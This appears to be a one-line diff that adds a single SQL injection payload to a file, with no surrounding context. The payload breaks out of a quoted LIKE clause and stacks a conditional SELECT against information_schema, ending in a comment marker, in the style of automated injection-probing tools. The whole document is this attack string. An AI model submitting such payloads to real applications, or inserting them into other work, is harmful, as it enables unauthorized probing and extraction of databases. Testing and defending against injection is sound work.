@@ -1,0 +1,1 @@
+1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
